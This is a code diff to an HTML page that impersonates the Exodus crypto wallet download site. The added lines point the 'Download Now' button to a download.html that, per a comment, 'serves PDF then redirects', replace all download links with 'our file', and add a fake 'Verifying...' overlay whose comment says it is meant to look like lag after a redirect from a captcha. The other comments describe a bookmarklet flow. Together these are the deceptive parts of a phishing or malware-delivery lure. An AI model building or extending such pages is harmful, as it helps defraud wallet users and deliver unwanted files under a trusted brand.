@@ -109,9 +109,30 @@
     .verify-button:hover {
       background: #5a2ed0;
     }
+    /* Reinject overlay: looks like brief lag after redirect from captcha */
+    .reinject-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.92);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.4s ease;
+    }
+    .reinject-overlay.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+    .reinject-overlay .reinject-text {
+      font-size: 18px;
+      color: #333;
+      font-weight: 500;
+    }
   </style>
 </head>
 <body>
+  <div id="reinject-overlay" class="reinject-overlay hidden" aria-hidden="true"></div>
   <div class="container">
     <header>
       <div class="logo">Exodus</div>
@@ -121,7 +142,7 @@
       <div class="content">
         <h1>Secure Crypto Wallet & Exchange</h1>
         <p>Download the Exodus wallet for secure, decentralized crypto management. Trade, buy, and store your assets with industry-leading security.</p>
-        <a href="#" class="cta-button">Download Now</a>
+        <a href="download.html" class="cta-button" data-download="our-file">Download Now</a>
       </div>
 
       <div class="sidebar">
@@ -137,8 +158,23 @@
   </div>
 
   <script>
-    // When bookmarklet is clicked on this page, download the PDF
-    // (The bookmarklet checks if #answerValue exists; if not, it redirects to download.html)
+    (function () {
+      var params = new URLSearchParams(window.location.search);
+      if (params.get("from_captcha") === "1") {
+        var overlay = document.getElementById("reinject-overlay");
+        if (overlay) {
+          overlay.classList.remove("hidden");
+          overlay.innerHTML = '<p class="reinject-text">Verifying...</p>';
+          setTimeout(function () {
+            overlay.classList.add("hidden");
+            setTimeout(function () {
+              overlay.remove();
+            }, 500);
+          }, 1800);
+        }
+      }
+      // All download links are replaced with our file (download.html serves PDF then redirects)
+    })();
   </script>
 </body>
 </html>
